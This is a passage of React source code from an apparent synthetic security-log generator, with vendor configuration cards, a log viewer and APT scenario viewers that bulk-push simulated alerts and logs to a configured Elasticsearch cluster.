function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes,linuxLogTypes,onLinuxLogTypes,oracleLogTypes,onOracleLogTypes,mssqlLogTypes,onMSSQLLogTypes,cloudtrailLogTypes,onCloudtrailLogTypes,oktaLogTypes,onOktaLogTypes,crowdstrikeLogTypes,onCrowdstrikeLogTypes,wdnsLogTypes,onWdnsLogTypes,hostnamePrefix,onHostnamePrefix,hostnameCap,onHostnameCap,includeAdmin,onIncludeAdmin,indexOverride,onIndexOverride}){
  return(
    <div onClick={()=>onToggle(vendor.id)} className={cn("relative cursor-pointer p-4 rounded-xl border-2 transition-all",selected?"border-blue-500 bg-blue-500/10 shadow-lg shadow-blue-500/10":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
      {selected&&<div className="absolute top-2 right-2 w-5 h-5 rounded-full bg-blue-500 flex items-center justify-center"><span className="text-white text-[10px]">✓</span></div>}
      <div className={cn("w-9 h-9 rounded-lg overflow-hidden mb-2.5",selected?"ring-2 ring-blue-400/50":"")}>
        <VendorLogo id={vendor.id}/>
      </div>
      <h3 className="font-semibold text-sm text-white mb-0.5">{vendor.name}</h3>
      <p className="text-xs text-gray-400 mb-2.5 line-clamp-2">{vendor.description}</p>
      <div className="flex flex-wrap gap-1">
        {vendor.tags.map(t=><Badge key={t} className="border-gray-600 text-gray-400">{t}</Badge>)}
      </div>
      {selected&&(
        <div className="mt-2.5 pt-2.5 border-t border-blue-500/20" onClick={e=>e.stopPropagation()}>
          <div className="flex items-center gap-1 mb-2">
            <span className="text-[10px] text-gray-500 flex-1">Randomness</span>
            {['low','med','high'].map(lvl=>(
              <button key={lvl} onClick={()=>onRandomness(vendor.id,lvl)} className={cn("px-2 py-0.5 rounded text-[10px] font-medium transition-colors",randomness===lvl?"bg-blue-500 text-white":"bg-gray-700/80 text-gray-400 hover:bg-gray-600 hover:text-white")}>
                {lvl.charAt(0).toUpperCase()+lvl.slice(1)}
              </button>
            ))}
          </div>
          <div className="flex items-center gap-2 mb-2">
            <label className="text-[10px] text-gray-500 flex-1">Min logs</label>
            <input type="number" min="1" value={minLogs} onChange={e=>onMinLogs(vendor.id,e.target.value)} className="w-20 bg-gray-900 border border-gray-600 rounded px-2 py-0.5 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500 text-right"/>
          </div>
          {vendor.id==='email'&&(
            <div className="mb-2">
              <label className="text-[10px] text-gray-500 block mb-1">Custom domain (@ suffix)</label>
              <input type="text" value={emailDomain} onChange={e=>onEmailDomain(e.target.value)} placeholder="e.g. acme.com" className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
            </div>
          )}
          {(vendor.id==='windows'||vendor.id==='linux'||vendor.id==='endpoint')&&(
            <div className="mb-2 space-y-1.5">
              <div>
                <label className="text-[10px] text-gray-500 block mb-1">Hostname prefix <span className="text-gray-600">(optional)</span></label>
                <input type="text" value={hostnamePrefix||''} onChange={e=>onHostnamePrefix(vendor.id,e.target.value)} placeholder={vendor.id==='windows'?'e.g. CORP-WIN':vendor.id==='linux'?'e.g. app-server':'e.g. DESKTOP'} className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
                {hostnamePrefix&&<p className="text-[9px] text-blue-400/70 mt-0.5">→ {hostnamePrefix}-001, {hostnamePrefix}-002…</p>}
              </div>
              <div className="flex items-center gap-2">
                <label className="text-[10px] text-gray-500 flex-1">Max unique hosts</label>
                <input type="number" min="1" max="500" value={hostnameCap??''} onChange={e=>onHostnameCap(vendor.id,e.target.value)} placeholder={String(VENDOR_POOL[vendor.id]?.[randomness]??'∞')} className="w-16 bg-gray-900 border border-gray-600 rounded px-2 py-0.5 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500 text-right"/>
              </div>
            </div>
          )}
          {(vendor.id==='endpoint'||vendor.id==='windows'||vendor.id==='linux')&&(
            <div className="flex items-center justify-between mb-2">
              <span className="text-[10px] text-gray-500">Include admin users</span>
              <button type="button" onClick={()=>onIncludeAdmin(vendor.id,!includeAdmin)}
                className="relative flex items-center rounded-full transition-colors"
                style={{width:28,height:16,background:includeAdmin?'rgba(59,130,246,0.8)':'rgba(75,85,99,0.6)',border:'1px solid '+(includeAdmin?'rgba(59,130,246,0.6)':'rgba(107,114,128,0.4)')}}>
                <span style={{position:'absolute',width:10,height:10,borderRadius:'50%',background:'white',top:2,left:includeAdmin?14:2,transition:'left 0.15s'}}/>
              </button>
            </div>
          )}
          {vendor.id==='windows'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(WIN_TYPE_LABELS).map(([t,label])=>{
                  const isOptional=t==='applocker'||t==='powershell';
                  const checked=(windowsLogTypes||WIN_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{
                    e.stopPropagation();
                    const cur=windowsLogTypes||WIN_TYPES_DEFAULT;
                    const next=checked?cur.filter(x=>x!==t):[...cur,t];
                    if(next.length>0)onWindowsLogTypes(next);
                  };
                  return(
                    <button key={t} type="button" onClick={toggle}
                      className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none"
                      style={{background:checked?'rgba(34,197,94,0.15)':isOptional?'rgba(239,68,68,0.15)':'rgba(55,65,81,0.6)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':isOptional?'rgba(239,68,68,0.4)':'rgba(75,85,99,0.5)'}`,color:checked?'#86efac':isOptional?'#fca5a5':'#9ca3af'}}>
                      <span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>
                      {label}
                      {isOptional&&<span style={{fontSize:'8px',opacity:0.7,marginLeft:'1px'}}>opt</span>}
                    </button>
                  );
                })}
              </div>
            </div>
          )}
          {vendor.id==='linux'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(LINUX_TYPE_LABELS).map(([t,label])=>{
                  const checked=(linuxLogTypes||LINUX_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{
                    e.stopPropagation();
                    const cur=linuxLogTypes||LINUX_TYPES_DEFAULT;
                    const next=checked?cur.filter(x=>x!==t):[...cur,t];
                    if(next.length>0)onLinuxLogTypes(next);
                  };
                  return(
                    <button key={t} type="button" onClick={toggle}
                      className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none"
                      style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}>
                      <span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>
                      {label}
                    </button>
                  );
                })}
              </div>
            </div>
          )}
          {vendor.id==='oracle'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(ORACLE_TYPE_LABELS).map(([t,label])=>{
                  const checked=(oracleLogTypes||ORACLE_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{
                    e.stopPropagation();
                    const cur=oracleLogTypes||ORACLE_TYPES_DEFAULT;
                    const next=checked?cur.filter(x=>x!==t):[...cur,t];
                    if(next.length>0)onOracleLogTypes(next);
                  };
                  return(
                    <button key={t} type="button" onClick={toggle}
                      className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none"
                      style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}>
                      <span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>
                      {label}
                    </button>
                  );
                })}
              </div>
            </div>
          )}
          {vendor.id==='mssql'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(MSSQL_TYPE_LABELS).map(([t,label])=>{
                  const checked=(mssqlLogTypes||MSSQL_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{
                    e.stopPropagation();
                    const cur=mssqlLogTypes||MSSQL_TYPES_DEFAULT;
                    const next=checked?cur.filter(x=>x!==t):[...cur,t];
                    if(next.length>0)onMSSQLLogTypes(next);
                  };
                  return(
                    <button key={t} type="button" onClick={toggle}
                      className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none"
                      style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}>
                      <span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>
                      {label}
                    </button>
                  );
                })}
              </div>
            </div>
          )}
          {vendor.id==='cloudtrail'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(CT_TYPE_LABELS).map(([t,label])=>{
                  const checked=(cloudtrailLogTypes||CT_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{e.stopPropagation();const cur=cloudtrailLogTypes||CT_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onCloudtrailLogTypes(next);};
                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
                })}
              </div>
            </div>
          )}
          {vendor.id==='okta'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(OKTA_TYPE_LABELS).map(([t,label])=>{
                  const checked=(oktaLogTypes||OKTA_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{e.stopPropagation();const cur=oktaLogTypes||OKTA_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onOktaLogTypes(next);};
                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
                })}
              </div>
            </div>
          )}
          {vendor.id==='crowdstrike'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(CS_TYPE_LABELS).map(([t,label])=>{
                  const checked=(crowdstrikeLogTypes||CS_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{e.stopPropagation();const cur=crowdstrikeLogTypes||CS_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onCrowdstrikeLogTypes(next);};
                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
                })}
              </div>
            </div>
          )}
          {vendor.id==='wdns'&&(
            <div className="mb-2">
              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
                {Object.entries(WDNS_TYPE_LABELS).map(([t,label])=>{
                  const checked=(wdnsLogTypes||WDNS_TYPES_DEFAULT).includes(t);
                  const toggle=e=>{e.stopPropagation();const cur=wdnsLogTypes||WDNS_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onWdnsLogTypes(next);};
                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
                })}
              </div>
            </div>
          )}
          {vendor.indices.length>0&&(
            <div className="space-y-0.5">
              {vendor.indices.slice(0,2).map(i=><p key={i} className="text-[9px] font-mono text-blue-400/80 truncate">{i}</p>)}
              {vendor.indices.length>2&&<p className="text-[9px] font-mono text-gray-500">+{vendor.indices.length-2} more</p>}
            </div>
          )}
          <div className="mt-2 pt-2 border-t border-blue-500/10">
            <label className="text-[10px] text-gray-500 block mb-1">Index override <span className="text-gray-600">(optional)</span></label>
            <input type="text" value={indexOverride||''} onChange={e=>onIndexOverride(vendor.id,e.target.value)} placeholder={vendor.indices[0]} className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-[10px] font-mono text-gray-200 focus:outline-none focus:border-amber-500 placeholder:text-gray-600"/>
            {indexOverride&&vendor.indices.length>1&&<p className="text-[9px] text-amber-400/70 mt-0.5">⚠ Overrides all {vendor.indices.length} default indices</p>}
          </div>
          {integrationMissing&&<p className="text-[9px] text-amber-400 mt-1">⚠ Integration not in Fleet</p>}
        </div>
      )}
    </div>
  );
}

// Log Viewer
function LogViewer({logs,vendorLabels}){
  const [active,setActive]=useState(null);
  const [expanded,setExpanded]=useState(false);
  const sources=Object.keys(logs);
  const cur=active||sources[0];
  const curLogs=logs[cur]||[];
  if(!sources.length)return null;
  const total=sources.reduce((s,k)=>s+logs[k].length,0);
  const copy=()=>navigator.clipboard.writeText(curLogs.join('\n'));
  const dl=()=>{const b=new Blob([curLogs.join('\n')],{type:'text/plain'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`${cur}-logs.log`;a.click();URL.revokeObjectURL(u);};
  return(
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="flex items-center justify-between p-3 border-b border-gray-700 flex-wrap gap-2">
        <div className="flex items-center gap-2">
          <span className="text-sm font-semibold text-white">Generated Logs</span>
          <Badge className="border-gray-600 text-gray-300 font-mono">{total} total</Badge>
        </div>
        <div className="flex gap-1.5">
          <Button size="sm" variant="outline" onClick={copy}>📋 Copy</Button>
          <Button size="sm" variant="outline" onClick={dl}>⬇ Download</Button>
          <Button size="sm" variant="ghost" onClick={()=>setExpanded(!expanded)}>{expanded?'⤓':'⤢'}</Button>
        </div>
      </div>
      {sources.length>1&&(
        <div className="flex gap-1 p-2 border-b border-gray-700 overflow-x-auto">
          {sources.map(s=>(
            <button key={s} onClick={()=>setActive(s)} className={cn("flex items-center gap-1.5 px-2.5 py-1 rounded-md text-xs font-medium transition-colors whitespace-nowrap",s===cur?"bg-blue-600 text-white":"text-gray-400 hover:text-white hover:bg-gray-700")}>
              {vendorLabels[s]||s}
              <span className="font-mono text-[10px] opacity-70">{logs[s].length}</span>
            </button>
          ))}
        </div>
      )}
      <div className={cn("overflow-auto bg-gray-950 transition-all",expanded?"max-h-[70vh]":"max-h-80")}>
        <pre className="p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap break-all">
          {curLogs.map((l,i)=>(
            <div key={i} className="hover:bg-gray-800/50 px-1 py-0.5 rounded flex gap-2">
              <span className="text-gray-600 select-none w-6 text-right shrink-0">{i+1}</span>
              <span>{l}</span>
            </div>
          ))}
        </pre>
      </div>
    </div>
  );
}

// APT Scenario Viewer
const SEV_COLOR={critical:'border-l-red-500',high:'border-l-orange-400',medium:'border-l-yellow-400',low:'border-l-blue-400'};
const SEV_DOT={critical:'bg-red-500',high:'bg-orange-400',medium:'bg-yellow-400',low:'bg-blue-400'};
const SEV_BADGE={critical:'border-red-500/40 text-red-400 bg-red-500/10',high:'border-orange-400/40 text-orange-400 bg-orange-400/10',medium:'border-yellow-400/40 text-yellow-300 bg-yellow-400/10',low:'border-blue-400/40 text-blue-400 bg-blue-400/10'};
const NOISE_LABELS={off:'No noise',low:'Low (~250 logs, 3 hosts)',medium:'Medium (~750 logs, 10 hosts)',high:'High (~1,650 logs, 20 hosts)'};

function APTScenarioViewer({scenario,data,elasticConfig}){
  const [noiseLevel,setNoiseLevel]=useState('medium');
  const [pushing,setPushing]=useState(false);
  const [pushResult,setPushResult]=useState(null);
  const [expanded,setExpanded]=useState({});
  const [showCurl,setShowCurl]=useState(false);
  const [showIocs,setShowIocs]=useState(false);
  if(!data?.alerts?.length)return null;
  const {meta,ctx,alerts}=data;
  const crits=alerts.filter(a=>a.kibana.alert.severity==='critical').length;
  const toggle=i=>setExpanded(p=>({...p,[i]:!p[i]}));

  const push=async()=>{
    if(!elasticConfig?.url){alert('No Elasticsearch config found');return;}
    setPushing(true);setPushResult(null);
    try{
      const bulkLines=[];
      // 1. Attack alerts → .alerts-security.alerts-default
      alerts.forEach(a=>{
        bulkLines.push(JSON.stringify({create:{_index:'.alerts-security.alerts-default'}}));
        bulkLines.push(JSON.stringify(a));
      });
      // 2. Scenario-correlated logs (real IOCs — firewall + endpoint)
      const coreLogs=generateScenarioCoreLogs(ctx,meta.timeRange);
      Object.entries(coreLogs).forEach(([vid,rawLogs])=>{
        const ing=VENDOR_INGEST[vid];if(!ing)return;
        rawLogs.forEach(raw=>{
          bulkLines.push(JSON.stringify({create:{_index:ing.getIndex(raw)}}));
          bulkLines.push(JSON.stringify(ing.toDoc(raw)));
        });
      });
      const coreCount=Object.values(coreLogs).reduce((s,l)=>s+l.length,0);
      // 3. Background noise → vendor indices
      const noise=generateScenarioNoise(noiseLevel);
      Object.entries(noise).forEach(([vid,rawLogs])=>{
        const ing=VENDOR_INGEST[vid];if(!ing)return;
        rawLogs.forEach(raw=>{
          bulkLines.push(JSON.stringify({create:{_index:ing.getIndex(raw)}}));
          bulkLines.push(JSON.stringify(ing.toDoc(raw)));
        });
      });
      const noiseCount=Object.values(noise).reduce((s,l)=>s+l.length,0);
      const res=await fetch(`${elasticConfig.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(elasticConfig),body:bulkLines.join('\n')+'\n'});
      if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      const d=await res.json();
      const errs=d.items?.filter(i=>i.create?.error||i.index?.error)||[];
      setPushResult({alerts:alerts.length,core:coreCount,noise:noiseCount,errors:errs.length,firstError:errs[0]?.create?.error?.reason||errs[0]?.index?.error?.reason});
    }catch(e){setPushResult({error:e.message});}
    finally{setPushing(false);}
  };

  const curl=elasticConfig?`curl -X POST "${elasticConfig.url.replace(/\/$/,'')}/_bulk" \\\n  -H "Authorization: ApiKey ${elasticConfig.apiKey}" \\\n  -H "Content-Type: application/x-ndjson" \\\n  --data-binary @apt-alerts.ndjson`:'';

  const dl=()=>{
    const coreLogs=generateScenarioCoreLogs(ctx,meta.timeRange);
    const noise=generateScenarioNoise(noiseLevel);
    const vendorLines=logs=>Object.entries(logs).flatMap(([vid,rawLogs])=>{const ing=VENDOR_INGEST[vid];if(!ing)return[];return rawLogs.map(raw=>`${JSON.stringify({create:{_index:ing.getIndex(raw)}})}\n${JSON.stringify(ing.toDoc(raw))}`);});
    const lines=[
      ...alerts.map(a=>`${JSON.stringify({create:{_index:'.alerts-security.alerts-default'}})}\n${JSON.stringify(a)}`),
      ...vendorLines(coreLogs),
      ...vendorLines(noise),
    ];
    const b=new Blob([lines.join('\n')+'\n'],{type:'application/x-ndjson'});
    const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`${scenario.id}-alerts.ndjson`;a.click();URL.revokeObjectURL(u);
  };

  return(
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="p-4 border-b border-gray-700 space-y-3">
        <div className="flex items-start justify-between flex-wrap gap-2">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="text-sm font-semibold text-white">{meta.name}</span>
              <Badge className="border-red-500/40 text-red-400 bg-red-500/10">{alerts.length} alerts</Badge>
              {crits>0&&<Badge className="border-red-500/40 text-red-400 bg-red-500/5">{crits} critical</Badge>}
              <Badge className="border-purple-500/40 text-purple-400 bg-purple-500/10">APT</Badge>
            </div>
            <p className="text-xs text-gray-400 max-w-2xl">{meta.description}</p>
            <p className="text-[10px] text-gray-500 mt-1">Attacker: <span className="text-gray-400">{meta.attackerProfile}</span> · Alerts index: <span className="font-mono text-blue-400/80">.alerts-security.alerts-default</span></p>
          </div>
        </div>
        {ctx&&<div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3 space-y-2">
          <button onClick={()=>setShowIocs(s=>!s)} className="flex items-center gap-2 w-full text-left">
            <span className="text-[11px] font-semibold text-amber-400">IOC Summary</span>
            <Badge className="border-amber-500/30 text-amber-400/80 bg-amber-500/10 text-[9px]">Real APT29 IOCs — VirusTotal detectable</Badge>
            <span className="text-[10px] text-gray-500 ml-auto">{showIocs?'▲ hide':'▼ show'}</span>
          </button>
          {showIocs&&<div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
            <div className="space-y-1">
              <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wider">Malware</p>
              <div className="space-y-0.5">
                <p className="text-[10px] text-gray-500">Family: <span className="text-amber-300 font-mono">{ctx.malwareFamily}</span></p>
                <p className="text-[10px] text-gray-500">File: <span className="text-gray-300 font-mono">{ctx.malwareFile}</span></p>
                <p className="text-[10px] text-gray-500 break-all">SHA256: <span className="text-red-400 font-mono">{ctx.malwareHash}</span></p>
              </div>
            </div>
            <div className="space-y-1">
              <p className="text-[10px] font-semibold text-gray-400 uppercase tracking-wider">Network IOCs</p>
              <div className="space-y-0.5">
                <p className="text-[10px] text-gray-500">C2 IP #1: <span className="text-red-400 font-mono">{ctx.c2IP}</span></p>
                <p className="text-[10px] text-gray-500">C2 IP #2: <span className="text-red-400 font-mono">{ctx.c2IP2}</span></p>
                <p className="text-[10px] text-gray-500">C2 Domain: <span className="text-orange-400 font-mono">{ctx.c2Domain}</span></p>
                <p className="text-[10px] text-gray-500">Phishing: <span className="text-orange-400 font-mono">{ctx.phishingDomain}</span></p>
              </div>
            </div>
          </div>}
        </div>}
        <div className="flex items-center gap-3 flex-wrap">
          <div className="flex items-center gap-2">
            <span className="text-[10px] text-gray-500">Background noise:</span>
            {['off','low','medium','high'].map(l=>(
              <button key={l} onClick={()=>setNoiseLevel(l)} className={cn('px-2 py-0.5 rounded text-[10px] font-medium transition-colors',noiseLevel===l?'bg-blue-500 text-white':'bg-gray-700/80 text-gray-400 hover:bg-gray-600 hover:text-white')}>
                {l.charAt(0).toUpperCase()+l.slice(1)}
              </button>
            ))}
            {noiseLevel!=='off'&&<span className="text-[10px] text-gray-600">{NOISE_LABELS[noiseLevel]}</span>}
          </div>
          <div className="flex gap-1.5 ml-auto flex-wrap">
            <Button size="sm" variant="outline" onClick={dl}>⬇ NDJSON</Button>
            {elasticConfig?.url&&<><Button size="sm" variant="outline" onClick={()=>setShowCurl(!showCurl)}>$ curl</Button><Button size="sm" onClick={push} disabled={pushing}>{pushing?'Pushing…':'⬆ Push to ES'}</Button></>}
          </div>
        </div>
        {showCurl&&curl&&<pre className="bg-gray-950 rounded-lg p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap">{curl}</pre>}
        {pushResult&&!pushResult.error&&(
          <div className={cn('flex items-center gap-2 p-2 rounded-lg text-xs',pushResult.errors>0?'bg-amber-500/10 border border-amber-500/30 text-amber-300':'bg-green-500/10 border border-green-500/30 text-green-400')}>
            {pushResult.errors>0?'⚠':'✓'} Pushed {pushResult.alerts} attack alerts + {pushResult.core} correlated logs + {pushResult.noise} noise logs{pushResult.errors>0?` — ${pushResult.errors} errors: ${pushResult.firstError}`:''}
          </div>
        )}
        {pushResult?.error&&<div className="flex items-center gap-2 p-2 rounded-lg text-xs bg-red-500/10 border border-red-500/30 text-red-400">✗ {pushResult.error}</div>}
      </div>
      <div className="p-4 space-y-2 max-h-[600px] overflow-y-auto">
        {alerts.map((a,i)=>{
          const sev=a.kibana.alert.severity;
          const rule=a.kibana.alert.rule;
          const threat=rule.threat?.[0];
          return(
            <div key={i} className={cn('border-l-2 bg-gray-800/40 rounded-r-lg overflow-hidden',SEV_COLOR[sev])}>
              <div className="flex items-start gap-3 p-3 cursor-pointer hover:bg-gray-700/30 transition-colors" onClick={()=>toggle(i)}>
                <div className="flex items-center gap-2 shrink-0 pt-0.5">
                  <span className="text-[10px] font-mono text-gray-500 w-4 text-right">{i+1}</span>
                  <div className={cn('w-2 h-2 rounded-full shrink-0',SEV_DOT[sev])}/>
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
                    <Badge className={SEV_BADGE[sev]}>{sev}</Badge>
                    <span className="text-xs font-medium text-white">{rule.name}</span>
                  </div>
                  <div className="flex items-center gap-3 flex-wrap">
                    <span className="text-[10px] text-gray-400">🖥 {a.host.name}</span>
                    <span className="text-[10px] text-gray-400">👤 {a.user.name}</span>
                    {a.process?.name&&<span className="text-[10px] text-gray-500 font-mono">{a.process.name}</span>}
                  </div>
                  {threat&&<p className="text-[10px] text-purple-400/80 mt-0.5">{threat.tactic.name} · {threat.technique?.[0]?.id} {threat.technique?.[0]?.name}</p>}
                </div>
                <span className="text-gray-500 text-xs shrink-0">{expanded[i]?'▲':'▼'}</span>
              </div>
              {expanded[i]&&<pre className="text-[10px] p-3 pt-0 text-gray-400 whitespace-pre-wrap break-all border-t border-gray-700/50 bg-gray-950/50 font-mono">{JSON.stringify(a,null,2)}</pre>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// Scenario Viewer
function ScenarioViewer({scenario,events,elasticConfig}){
  const [pushing,setPushing]=useState(false);
  const [expanded,setExpanded]=useState({});
  const [showCurl,setShowCurl]=useState(false);
  if(!events?.length)return null;
  const toggle=(i)=>setExpanded(p=>({...p,[i]:!p[i]}));
  const SCOLOR={critical:'border-l-red-500',high:'border-l-orange-400',medium:'border-l-yellow-400',low:'border-l-blue-400'};
  const SDOT={critical:'bg-red-500',high:'bg-orange-400',medium:'bg-yellow-400',low:'bg-blue-400'};
  const SRCCOLOR={'Elastic Security Alert':'text-red-400','Fortinet FortiGate':'text-orange-400','Microsoft Exchange':'text-blue-400','Endpoint Telemetry':'text-emerald-400','Windows Security':'text-purple-400','Palo Alto Networks':'text-orange-500','Linux / Syslog':'text-gray-400'};
  const dl=()=>{
    const ndjson=events.map(e=>{let doc;try{doc=JSON.parse(e.log);}catch{doc={message:e.log};}if(!doc['@timestamp'])doc['@timestamp']=e.timestamp.toISOString();let idx='logs-endpoint.events.process-default';if(e.source==='Elastic Security Alert')idx='.alerts-security.alerts-default';else if(e.source==='Fortinet FortiGate')idx='logs-fortinet.fortigate.utm-default';else if(e.source==='Windows Security')idx='logs-windows.security-default';return`${JSON.stringify({create:{_index:idx}})}\n${JSON.stringify(doc)}`;}).join('\n')+'\n';
    const b=new Blob([ndjson],{type:'application/x-ndjson'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=`scenario-${scenario.id}.ndjson`;a.click();URL.revokeObjectURL(u);
  };
  const push=async()=>{
    if(!elasticConfig?.url)return;
    setPushing(true);
    try{
      const lines=events.map(e=>{let doc;try{doc=JSON.parse(e.log);}catch{doc={message:e.log};}if(!doc['@timestamp'])doc['@timestamp']=e.timestamp.toISOString();let idx='logs-endpoint.events.process-default';if(e.source==='Elastic Security Alert')idx='.alerts-security.alerts-default';else if(e.source==='Fortinet FortiGate')idx='logs-fortinet.fortigate.utm-default';else if(e.source==='Windows Security')idx='logs-windows.security-default';return`${JSON.stringify({create:{_index:idx}})}\n${JSON.stringify(doc)}`;});
      const res=await fetch(`${elasticConfig.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(elasticConfig),body:lines.join('\n')+'\n'});
      if(!res.ok)throw new Error(`HTTP ${res.status}`);
      alert(`✓ Pushed ${events.length} scenario events`);
    }catch(e){alert(`Push failed: ${e.message}`);}
    finally{setPushing(false);}
  };
  const curl=elasticConfig?`curl -X POST "${elasticConfig.url.replace(/\/$/,'')}/_bulk" \\\n  -H "Authorization: ApiKey ${elasticConfig.apiKey}" \\\n  -H "Content-Type: application/x-ndjson" \\\n  --data-binary @scenario-${scenario.id}.ndjson`:'';
  const crits=events.filter(e=>e.severity==='critical').length;
  return(
    <div className="rounded-xl border border-gray-700 bg-gray-900 overflow-hidden">
      <div className="p-4 border-b border-gray-700">
        <div className="flex items-center justify-between flex-wrap gap-2">
          <div className="flex items-center gap-2">
            <span className="text-sm font-semibold text-white">{scenario.name}</span>
            <Badge className="border-gray-600 text-gray-300 font-mono">{events.length} events</Badge>
            {crits>0&&<Badge className="border-red-500/40 text-red-400 bg-red-500/10">{crits} critical</Badge>}
          </div>
          <div className="flex gap-1.5 flex-wrap">
